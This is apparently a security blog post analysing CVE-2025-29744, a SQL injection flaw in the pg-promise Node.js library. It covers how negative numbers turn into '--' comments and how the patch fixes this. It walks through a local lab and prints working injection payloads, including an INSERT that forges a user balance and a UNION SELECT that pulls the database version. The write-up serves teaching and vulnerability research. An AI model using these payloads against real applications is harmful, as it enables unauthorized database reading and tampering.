<!doctype html><html lang=en-US><head><meta http-equiv=X-Clacks-Overhead content="GNU Terry Pratchett"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" href=https://awwfensive.site/favicon.png><title>Exploiting CVE-2025-29744: When Prepared Statements Aren't Safe | aniket/awwfensive</title><meta name=title content="Exploiting CVE-2025-29744: When Prepared Statements Aren't Safe"><meta name=description content="



  Table Of Contents
  
  
    Vulnerability Details
    Setting up a vulnerable lab; Exploitation; Impact
      
        Setting up the vulnerable application
        Initial Testing
      
    
    Crafting the Impact: using PostgreSQL against PostgreSQL
      
        Exploitation Example
      
    
    The Patch
      
        Ensuring valid input
        Conversion to string
        Safe Formatting: Parentheses
      
    
    End Note
    References
  


This post analyzes a subtle SQL injection vulnerability — CVE-2025-29744 — in pg-promise, a popular PostgreSQL library for Node.js built on top of node-postgres.
Discovered by the Sonar team, this flaw affects how pg-promise handles certain prepared statements when using the simple query protocol. Under specific conditions, it may allow attackers to inject SQL—even if first-party code uses parameterized queries."><meta name=keywords content><meta property="og:url" content="https://awwfensive.site/exploiting-cve-2025-29744-when-prepared-statements-arent-safe/"><meta property="og:site_name" content="aniket/awwfensive"><meta property="og:title" content="Exploiting CVE-2025-29744: When Prepared Statements Aren't Safe"><meta property="og:description" content="Table Of Contents Vulnerability Details Setting up a vulnerable lab; Exploitation; Impact Setting up the vulnerable application Initial Testing Crafting the Impact: using PostgreSQL against PostgreSQL Exploitation Example The Patch Ensuring valid input Conversion to string Safe Formatting: Parentheses End Note References This post analyzes a subtle SQL injection vulnerability — CVE-2025-29744 — in pg-promise, a popular PostgreSQL library for Node.js built on top of node-postgres.
Discovered by the Sonar team, this flaw affects how pg-promise handles certain prepared statements when using the simple query protocol. Under specific conditions, it may allow attackers to inject SQL—even if first-party code uses parameterized queries."><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-08-02T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exploiting CVE-2025-29744: When Prepared Statements Aren't Safe"><meta name=twitter:description content="Table Of Contents Vulnerability Details Setting up a vulnerable lab; Exploitation; Impact Setting up the vulnerable application Initial Testing Crafting the Impact: using PostgreSQL against PostgreSQL Exploitation Example The Patch Ensuring valid input Conversion to string Safe Formatting: Parentheses End Note References This post analyzes a subtle SQL injection vulnerability — CVE-2025-29744 — in pg-promise, a popular PostgreSQL library for Node.js built on top of node-postgres.
Discovered by the Sonar team, this flaw affects how pg-promise handles certain prepared statements when using the simple query protocol. Under specific conditions, it may allow attackers to inject SQL—even if first-party code uses parameterized queries."><meta itemprop=name content="Exploiting CVE-2025-29744: When Prepared Statements Aren't Safe"><meta itemprop=description content="Table Of Contents Vulnerability Details Setting up a vulnerable lab; Exploitation; Impact Setting up the vulnerable application Initial Testing Crafting the Impact: using PostgreSQL against PostgreSQL Exploitation Example The Patch Ensuring valid input Conversion to string Safe Formatting: Parentheses End Note References This post analyzes a subtle SQL injection vulnerability — CVE-2025-29744 — in pg-promise, a popular PostgreSQL library for Node.js built on top of node-postgres.
Discovered by the Sonar team, this flaw affects how pg-promise handles certain prepared statements when using the simple query protocol. Under specific conditions, it may allow attackers to inject SQL—even if first-party code uses parameterized queries."><meta itemprop=datePublished content="2025-08-02T00:00:00+00:00"><meta itemprop=dateModified content="2025-08-02T00:00:00+00:00"><meta itemprop=wordCount content="1108"><meta name=referrer content="no-referrer-when-downgrade"><style>:root{--width:720px;--font-main:Verdana, sans-serif;--font-secondary:Verdana, sans-serif;--font-scale:1em;--background-color:#fff;--heading-color:#222;--text-color:#444;--link-color:#3273dc;--visited-color:#8b6fcb;--blockquote-color:#222}@media(prefers-color-scheme:dark){:root{--background-color:#01242e;--heading-color:#eee;--text-color:#ddd;--link-color:#8cc2dd;--visited-color:#8b6fcb;--blockquote-color:#ccc}}body{font-family:var(--font-secondary);font-size:var(--font-scale);margin:auto;padding:20px;max-width:var(--width);text-align:left;background-color:var(--background-color);word-wrap:break-word;overflow-wrap:break-word;line-height:1.5;color:var(--text-color)}h1,h2,h3,h4,h5,h6{font-family:var(--font-main);color:var(--heading-color)}a{color:var(--link-color);cursor:pointer;text-decoration:none}a:hover{text-decoration:underline}nav a{margin-right:8px}strong,b{color:var(--heading-color)}button{margin:0;cursor:pointer}time{font-family:monospace;font-style:normal;font-size:15px}main{line-height:1.6}table{width:100%}hr{border:0;border-top:1px dashed}img{max-width:100%}code{font-family:monospace;padding:2px;border-radius:3px}blockquote{border-left:1px solid #999;color:var(--blockquote-color);padding-left:20px;font-style:italic}footer{padding:25px 0;text-align:center}.title:hover{text-decoration:none}.title h1{font-size:1.5em}.inline{width:auto!important}.highlight,.code{border-radius:3px;margin-block-start:1em;margin-block-end:1em;overflow-x:auto}ul.blog-posts{list-style-type:none;padding:unset}ul.blog-posts li{display:flex}ul.blog-posts li span{flex:0 0 130px}ul.blog-posts li a:visited{color:var(--visited-color)}</style><script src=https://cdn.jsdelivr.net/gh/adryd325/oneko.js@latest/oneko.js defer data-cat=/oneko.gif></script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&display=swap" rel=stylesheet><style>:root{--bg:#ffffff;--text:#000000;--link:#ff6666}@media(prefers-color-scheme:light){:root{--bg:#ffffff;--text:#000000;--link:#ff6666}}::selection{background-color:#b3d9ff;color:#000}::-moz-selection{background-color:#b3d9ff;color:#000}body{background-color:#fff;color:#333;font-family:roboto mono,monospace;line-height:1.6;font-size:1em;max-width:720px;margin:0 auto;padding:20px}h1,h2,h3,h4,h5,h6,p,li,span,div{color:#000!important;font-family:roboto mono,monospace}strong,b,em,i,mark{color:#000!important}h1{font-size:2em;line-height:1.2}h2{font-size:1.5em;margin-top:2rem}h3{font-size:1.2em;margin-top:1.5rem}header h1,header h1 a,header a.title,body>header>h1,body>header>h1>a{color:#000!important;text-decoration:none!important;font-size:1.1em;font-family:roboto mono,monospace}header h1 a:hover{color:#000!important}article h1,article h2,main h1,main h2{color:#000!important}a{color:#000!important;text-decoration:none!important;border-bottom:2.5px solid #f66;padding-bottom:2px}a:hover{color:#000!important;border-bottom-color:#ff4d4d}header h1 a{text-decoration:none!important}header nav a{margin-right:1.5rem}time,.date{color:#5f7bdc!important}#theme-toggle{color:var(--link)!important;text-decoration:none!important;font-size:1.2em;cursor:pointer;transition:opacity .2s ease;display:inline-block;margin-left:1.5rem}#theme-toggle:hover{opacity:.7}header{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:2rem}footer{border-top:none;padding-top:1rem;margin-top:3rem}.blog-posts article{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:1rem}.blog-posts article:last-child{border-bottom:none}.highlight{margin:1.5rem 0}.highlight pre{background-color:#f5f5f5!important;color:#333!important;padding:1.25rem 1.5rem;border-radius:12px;overflow-x:auto;line-height:1.6;border:1px solid #e5e5e5}.highlight pre::-webkit-scrollbar{height:8px;border-radius:0 0 12px 12px}.highlight pre::-webkit-scrollbar-track{background-color:#f5f5f5;border-radius:0 0 12px 12px}.highlight pre::-webkit-scrollbar-thumb{background-color:#ccc;border-radius:4px}.highlight pre::-webkit-scrollbar-thumb:hover{background-color:#aaa}.highlight pre{scrollbar-width:thin;scrollbar-color:#ccc #f5f5f5}.highlight pre code,.highlight code{background:0 0!important;color:inherit!important;padding:0;font-size:.9em}code{font-family:roboto mono,courier new,monospace;font-size:.9em}p code,li code,h1 code,h2 code,h3 code{background-color:#f0f0f0!important;color:#c00!important;padding:2px 6px;border-radius:6px;font-size:.9em}.highlight .c,.highlight .cm,.highlight .c1,.highlight .cs,.highlight .sd{color:green!important;font-style:italic}.highlight .cp{color:green!important}.highlight .err,.highlight .gd,.highlight .gr,.highlight .gt,.highlight .ne{color:#e60000!important}.highlight .k,.highlight .kc,.highlight .kp,.highlight .kr{color:#af00db!important}.highlight .kd,.highlight .kn,.highlight .kt{color:#06c!important}.highlight .o,.highlight .ow,.highlight .w{color:#333!important}.highlight .ge{color:#333;font-style:italic}.highlight .gh,.highlight .gp,.highlight .gu{color:#06c!important;font-weight:700}.highlight .gi{color:green!important}.highlight .go{color:#666!important}.highlight .gs{color:#333;font-weight:700}.highlight .m,.highlight .mb,.highlight .mf,.highlight .mh,.highlight .mi,.highlight .mo,.highlight .il{color:#f60!important}.highlight .s,.highlight .sa,.highlight .sb,.highlight .sc,.highlight .dl,.highlight .s2,.highlight .sh,.highlight .si,.highlight .sx,.highlight .sr,.highlight .s1,.highlight .ss{color:#c41a16!important}.highlight .se{color:#af00db!important}.highlight .na,.highlight .nb,.highlight .ni,.highlight .nv,.highlight .bp,.highlight .vc,.highlight .vg,.highlight .vi,.highlight .vm{color:#06c!important}.highlight .nc,.highlight .nn,.highlight .nt{color:teal!important}.highlight .no{color:#f60!important}.highlight .nd,.highlight .nf,.highlight .fm{color:#06c!important}.highlight .nl{color:#06c!important}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents ul{list-style:disc;padding-left:2rem;margin:.5rem 0}#TableOfContents>ul{padding-left:2rem}#TableOfContents ul ul{list-style:circle;padding-left:2rem}#TableOfContents li{margin:.5rem 0}#TableOfContents a{color:#000!important;text-decoration:none!important;border-bottom:2.5px solid #f66!important;padding-bottom:2px}#TableOfContents a:hover{color:#000!important;border-bottom-color:#ff4d4d!important}table{width:100%;border-collapse:collapse;margin:1.5rem 0;background-color:#fff}table th,table td{padding:.75rem;text-align:left;border:1px solid #d0d0d0}table th{background-color:#f9f9f9;font-weight:700;color:#000}table code{background-color:#f0f0f0;padding:2px 6px;border-radius:3px;color:#c00}figure{margin:1.5rem 0}figure img,.clickable-img{max-width:100%;width:100%;height:auto;display:block;cursor:pointer;transition:opacity .2s ease}figure img:hover,.clickable-img:hover{opacity:.8}.lightbox-modal{display:none;position:fixed;z-index:9999;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.8);animation:fadeIn .3s}.lightbox-modal.active{display:flex;align-items:center;justify-content:center}.lightbox-content{position:relative;max-width:90%;max-height:90vh;animation:zoomIn .3s}.lightbox-content img{max-width:100%;max-height:85vh;width:auto;height:auto}.lightbox-close{position:absolute;top:-30px;right:0;color:#fff;font-size:28px;font-weight:700;cursor:pointer;user-select:none}.lightbox-close:hover{color:#ccc}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes zoomIn{from{transform:scale(.8)}to{transform:scale(1)}}</style><script>document.addEventListener("DOMContentLoaded",function(){const e=document.createElement("div");e.className="lightbox-modal",e.innerHTML='<div class="lightbox-content"><span class="lightbox-close">&times;</span><img id="lightbox-img" src="" alt=""></div>',document.body.appendChild(e),document.querySelectorAll("figure img").forEach(t=>{t.style.cursor="pointer",t.addEventListener("click",function(){document.getElementById("lightbox-img").src=this.src,e.classList.add("active")})}),document.querySelector(".lightbox-close").addEventListener("click",function(){e.classList.remove("active")}),e.addEventListener("click",function(e){e.target===this&&this.classList.remove("active")}),document.addEventListener("keydown",function(t){t.key==="Escape"&&e.classList.remove("active")})})</script></head><body><header><a href=/ class=title><h2>aniket/awwfensive</h2></a><nav><a href=/>Home</a>
<a href=/blog/>Blog</a>
<a href=/projects/>Projects</a></nav></header><main><h1>Exploiting CVE-2025-29744: When Prepared Statements Aren't Safe</h1><p><i><time datetime=2025-08-02>02 Aug, 2025</time></i></p><content><figure class=clickable-img><img src=/CVE-2024-29744/1.webp alt=snippet></figure><div class=toc><h3>Table Of Contents</h3><nav id=TableOfContents><ul><li><a href=#vulnerability-details>Vulnerability Details</a></li><li><a href=#setting-up-a-vulnerable-lab-exploitation-impact>Setting up a vulnerable lab; Exploitation; Impact</a><ul><li><a href=#setting-up-the-vulnerable-application>Setting up the vulnerable application</a></li><li><a href=#initial-testing>Initial Testing</a></li></ul></li><li><a href=#crafting-the-impact-using-postgresql-against-postgresql>Crafting the Impact: using PostgreSQL against PostgreSQL</a><ul><li><a href=#exploitation-example>Exploitation Example</a></li></ul></li><li><a href=#the-patch>The Patch</a><ul><li><a href=#ensuring-valid-input>Ensuring valid input</a></li><li><a href=#conversion-to-string>Conversion to string</a></li><li><a href=#safe-formatting-parentheses>Safe Formatting: Parentheses</a></li></ul></li><li><a href=#end-note>End Note</a></li><li><a href=#references>References</a></li></ul></nav></div><p>This post analyzes a subtle SQL injection vulnerability — <strong>CVE-2025-29744</strong> — in pg-promise, a popular PostgreSQL library for Node.js built on top of node-postgres.</p><p>Discovered by the Sonar team, this flaw affects how pg-promise handles certain prepared statements when using the simple query protocol. Under specific conditions, it may allow attackers to inject SQL—even if first-party code uses parameterized queries.</p><p><strong>Exploitation requires:</strong></p><ul><li>Use of prepared statements in a particular structure.</li><li>Use of the simple query protocol instead of the extended one.</li></ul><hr><h2 id=vulnerability-details>Vulnerability Details</h2><p>The vulnerability involved injecting inline comments in a situation where subtraction from a value was possible, such as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>query</span> <span class=o>=</span> <span class=s1>&#39;UPDATE users SET balance = balance-$1 WHERE id = $2&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>none</span><span class=p>(</span><span class=nx>query</span><span class=p>,</span> <span class=p>[</span><span class=nx>amount</span><span class=p>,</span> <span class=nx>userId</span><span class=p>]);</span>
</span></span></code></pre></div><p>In this JS snippet, <code>$1</code> is replaced with the value of <code>amount</code> and <code>$2</code> is replaced with <code>userId</code> in a prepared statement. Assuming <code>$1</code> is user controlled input, if the user enters negative value say <code>-5</code> the SQL statement becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UPDATE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>SET</span><span class=w> </span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>balance</span><span class=c1>--5 WHERE id = 1
</span></span></span></code></pre></div><p>This situation results in inline commenting a part of the statement from the point of user input, which means <code>5 WHERE id = 1</code> was commented out and ignored.</p><p>Usually prepared statements are considered a secure practice to prevent SQL injection, but different libraries might handle comments differently, just like MySQL requires whitespace after the <code>--</code> start comment sequence.</p><hr><h2 id=setting-up-a-vulnerable-lab-exploitation-impact>Setting up a vulnerable lab; Exploitation; Impact</h2><p>In practical applications, the requirements for exploiting this CVE are quite stringent. In this section, we&rsquo;ll explore what conditions are necessary for exploitation, what worked in our testing, and what didn&rsquo;t.</p><h3 id=setting-up-the-vulnerable-application>Setting up the vulnerable application</h3><p>To test the exploitability of this CVE locally, I built a minimal inventory app where users can input an amount and a username. These inputs are used in a SQL statement that modifies the user&rsquo;s balance, satisfying the vulnerability prerequisites.</p><p><strong>Lab setup:</strong></p><p><a href=https://github.com/awwfensive/auditPlayground/>cvePlayground</a> is a repository of intentionally vulnerable CVE labs with detailed writeups and reproducible environments for hands-on learning and security research.</p><p>[FOLDER] <strong>This writeup corresponds to the following lab:</strong> <a href=https://github.com/awwfensive/auditPlayground/tree/main/SQLI/CVE-2025-29744>CVE-2025-29744 — pg-promise SQL Injection</a></p><p>You&rsquo;ll find setup instructions and exploitation steps inside the linked repository folder.</p><figure class=clickable-img><img src=/CVE-2024-29744/2.webp alt=snippet></figure><p>Following is the snippet where the vulnerability exists, even thought the application uses prepared statements, the application is vulnerable to SQL injection because vulnerable library pg-promise v11.5.4 failed to implement required security standards which leads to commenting the query when a negative integer is entered.</p><figure class=clickable-img><img src=/CVE-2024-29744/3.webp alt=app></figure><h3 id=initial-testing>Initial Testing</h3><p>When submitting the <code>-1</code> as the input 1 (amount) and <code>cat</code> as the input 2 which is an existing user in the database, the Node.js server throws an error.</p><figure class=clickable-img><img src=/CVE-2024-29744/4.webp alt=snippet></figure><p>The following error is a clear indication that the SQL statement failed due PostgreSQL encountering a syntax error because the query ended unexpectedly, likely due to an improperly handled comment (<code>--</code>).</p><p>The query contains:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>pg_promise_example</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>result</span><span class=o>=</span><span class=c1>--1 OR name=&#39;cat&#39;;
</span></span></span></code></pre></div><p>and PostgreSQL interpreted it as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>pg_promise_example</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>result</span><span class=o>=</span><span class=w>
</span></span></span></code></pre></div><p>resulting an error.</p><p>The error confirms that the inline comment sequence is indeed commenting out rest of the query.</p><hr><h2 id=crafting-the-impact-using-postgresql-against-postgresql>Crafting the Impact: using PostgreSQL against PostgreSQL</h2><p>The official POC mentioned, PostgreSQL supports multi literals, which means a new line character (<code>\n</code>) can be used to pass multiple inputs! When <code>-1</code> is passed that comments rest of the statement, passing <code>foo \n bar</code> makes the query look like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>pg_promise_example</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>result</span><span class=o>=</span><span class=c1>--1 OR name=&#39;foo
</span></span></span><span class=line><span class=cl><span class=n>bar</span><span class=s1>&#39;;
</span></span></span></code></pre></div><p>As a result, when PostgreSQL parses this query, it will ignore the comments and treat <code>bar';</code> as additional statement.</p><p>An attacker can craft malicious query such as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>pg_promise_example</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>result</span><span class=o>=</span><span class=c1>--1 OR name=&#39;foo
</span></span></span><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>balance</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=mi>1337</span><span class=p>,</span><span class=s2>&#34;BigCat&#34;</span><span class=p>,</span><span class=mi>13370000</span><span class=p>)</span><span class=s1>&#39;;--&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><h3 id=exploitation-example>Exploitation Example</h3><p>Moving back to our vulnerable application, let&rsquo;s enumerate version of the database with the above discussed knowledge.</p><figure class=clickable-img><img src=/CVE-2024-29744/5.webp alt=testinp></figure><p>Again, <code>-1</code> comments the statement, and after <code>cat</code> a new line is treated as multi literal which makes the query look like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>pg_promise_example</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>result</span><span class=o>=</span><span class=c1>--1 OR name=&#39;cat 
</span></span></span><span class=line><span class=cl><span class=mi>1</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>0</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1337</span><span class=p>,</span><span class=w> </span><span class=k>version</span><span class=p>();</span><span class=w> </span><span class=c1>--
</span></span></span></code></pre></div><figure class=clickable-img><img src=/CVE-2024-29744/6.webp alt=queryresult></figure><p>From this point on, we have significant control — <strong>the possibilities are wide open.</strong></p><hr><h2 id=the-patch>The Patch</h2><p>To address the vulnerability, the pg-promise team introduced a utility function designed to safely format numeric values before injecting them into SQL queries—especially in contexts involving subtraction.</p><figure class=clickable-img><img src=/CVE-2024-29744/7.webp alt=queryresult></figure><p>This utility is responsible for converting numeric values into safe SQL-friendly strings, and here&rsquo;s how it works:</p><h3 id=ensuring-valid-input>Ensuring valid input</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>num</span> <span class=o>===</span> <span class=s1>&#39;bigint&#39;</span> <span class=o>||</span> <span class=nb>Number</span><span class=p>.</span><span class=nb>isFinite</span><span class=p>(</span><span class=nx>num</span><span class=p>))</span>
</span></span></code></pre></div><p>This condition ensures that the function only operates on a valid numeric inputs:</p><ul><li><code>typeof num === 'bigint'</code> : results to true if the input is a BigInt (example - <code>123n</code>)</li><li><code>Number.isFinite(num)</code> : results to true if it&rsquo;s a finite number (not <code>NaN</code>, <code>Infinity</code>, etc.)</li></ul><p>To conclude, this block of code only run for valid BigInt or finite numbers.</p><h3 id=conversion-to-string>Conversion to string</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>s</span> <span class=o>=</span> <span class=nx>num</span><span class=p>.</span><span class=nx>toString</span><span class=p>();</span>
</span></span></code></pre></div><p>Once confirmed as safe, the number is converted to a string for formatting and interpolation.</p><h3 id=safe-formatting-parentheses>Safe Formatting: Parentheses</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>return</span> <span class=nx>num</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=o>?</span> <span class=sb>`(</span><span class=si>${</span><span class=nx>s</span><span class=si>}</span><span class=sb>)`</span> <span class=o>:</span> <span class=nx>s</span><span class=p>;</span>
</span></span></code></pre></div><p>A classic ternary operator that returns:</p><ul><li><strong>If the number is negative</strong>, it wraps the value in parentheses. For example, <code>-100</code> turns into <code>"(-100)"</code>.<ul><li>This prevents PostgreSQL from misinterpreting a double dash (<code>--</code>) formed during inline subtraction as the start of a comment.</li></ul></li><li><strong>If the number is non-negative</strong> i.e. positive or zero, it returns the number as a string. For example, <code>10</code> as a input is turned into <code>"10"</code>.</li></ul><p>This formatting cleverly avoid accidental Comment injection from input like <code>--5</code>, which would previously result in syntactically invalid or exploitable SQL like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UPDATE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>SET</span><span class=w> </span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>balance</span><span class=c1>--5 WHERE id = 1;
</span></span></span><span class=line><span class=cl><span class=c1>-- becomes → UPDATE users SET balance = balance [COMMENT START]
</span></span></span></code></pre></div><hr><h2 id=end-note>End Note</h2><p>PostgreSQL treats anything after <code>--</code> as a comment unless it&rsquo;s wrapped correctly. By transforming negative numbers into parentheses, like <code>(-5)</code> instead of <code>--5</code>, the patch neutralizes the risk of inline comment injection, even when using string substitution inside unsafe queries.</p><p>This simple but effective patch showcases how even well-intentioned ORMs can become vulnerable when lower-level SQL syntax rules (like comment delimiters) aren&rsquo;t handled precisely.</p><p>If you enjoyed reading this blog and are passionate about CVE reversing or building hands-on CVE labs for practicing real-world web hacking scenarios, consider contributing to <a href=https://github.com/awwfensive/auditPlayground/>cvePlayground</a> — a collection of intentionally vulnerable applications designed for learning and experimentation.</p><p><strong>Check it out on GitHub:</strong> <a href=https://github.com/awwfensive/auditPlayground/>https://github.com/awwfensive/cvePlayground</a></p><hr><h2 id=references>References</h2><ul><li><a href=https://www.sonarsource.com/blog/double-dash-double-trouble-a-subtle-sql-injection-flaw/>Sonar Source Blog: Double Dash Double Trouble</a></li><li><a href=https://github.com/awwfensive/cvePlayground>cvePlayground GitHub Repository</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2025-29744#range-16814870>CVE-2025-29744 NVD Entry</a></li><li><a href=https://github.com/vitaly-t/pg-promise/discussions/911>pg-promise Discussion #911</a></li><li><a href=https://www.pgcli.com/multi-line>PostgreSQL Multi-line Commands</a></li></ul></content><p></p></main><footer><footer><p style=text-align:center;margin-bottom:.5rem;color:#8f0000!important>trying.</p></footer></footer></body></html>